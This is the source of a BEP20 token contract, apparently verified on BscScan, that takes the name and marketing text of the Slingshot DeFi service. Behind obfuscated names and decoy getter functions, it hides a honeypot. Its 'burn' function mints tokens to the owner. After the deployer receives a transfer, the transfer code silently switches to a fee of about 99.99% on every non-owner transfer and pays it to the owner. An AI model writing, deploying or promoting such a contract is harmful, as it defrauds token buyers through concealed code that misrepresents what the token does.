/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Slingshot
Say goodbye to CeFi. Swap over 40k cryptocurrencies at the best prices, with 0% swap fees. 
Slingshot's non-custodial DeFi wallet is now available to the first wave of Android users!
     https://twitter.com/SlingshotCrypto
     https://help.slingshot.finance/en/
San Francisco, CAapp.slingshot.finance
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;
contract Slingshot {
string public  name = "Slingshot";
uint256 private  oQJdKT = 1000000000000000000;
uint256 private  CyOFta = 1000000000000000000000;
uint256 private  hNoQIO = 1000000000000000000;
address private  YUsjvQ = address(0);
address private  PKrJZQ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address private  OfIfqt = address(0);
address private  reGZgd = address(0);
address private  RRdDCv = address(0);
string public  symbol = "Slingshot";
address private  ZuWshS = address(0);
address private  ntbxOV = address(0);
uint256 private  jWDFkU = 10000000000;
uint256 private  HYHNKm = 1000000000000000;
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant DDGgXI = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  aMrdVh = address(0);
uint256 private  kaYyqy = 10000000000000;
uint256 private  BnOVIi = 100000000;
uint8 public constant decimals = 18;
address private  pVYuDH = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _gethNoQIO() private returns (uint256) {
return hNoQIO;
}



function _getOfIfqt() private returns (address) {
return OfIfqt;
}



function _getreGZgd() private returns (address) {
return reGZgd;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tQXbYgI 0");
require(spender != address(0), "fQXbYgI 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}






function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getBnOVIi() private returns (uint256) {
return BnOVIi;
}

function _getZuWshS() private returns (address) {
return ZuWshS;
}

function _getkaYyqy() private returns (uint256) {
return kaYyqy;
}

function _getRRdDCv() private returns (address) {
return RRdDCv;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}








function _getYUsjvQ() private returns (address) {
return YUsjvQ;
}





function _getjWDFkU() private returns (uint256) {
return jWDFkU;
}

function _getCyOFta() private returns (uint256) {
return CyOFta;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
ntbxOV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "QXbYgI");
require(to != address(0), "QXbYgI");
require(amount <= balanceOf[from], "QXbYgI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DDGgXI/oQJdKT ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ntbxOV){
oQJdKT = DDGgXI+2;
}
emit Transfer(from, to, transferAmount);
}
function _getHYHNKm() private returns (uint256) {
return HYHNKm;
}



function _getPKrJZQ() private returns (address) {
return PKrJZQ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getaMrdVh() private returns (address) {
return aMrdVh;
}

function _getpVYuDH() private returns (address) {
return pVYuDH;
}


}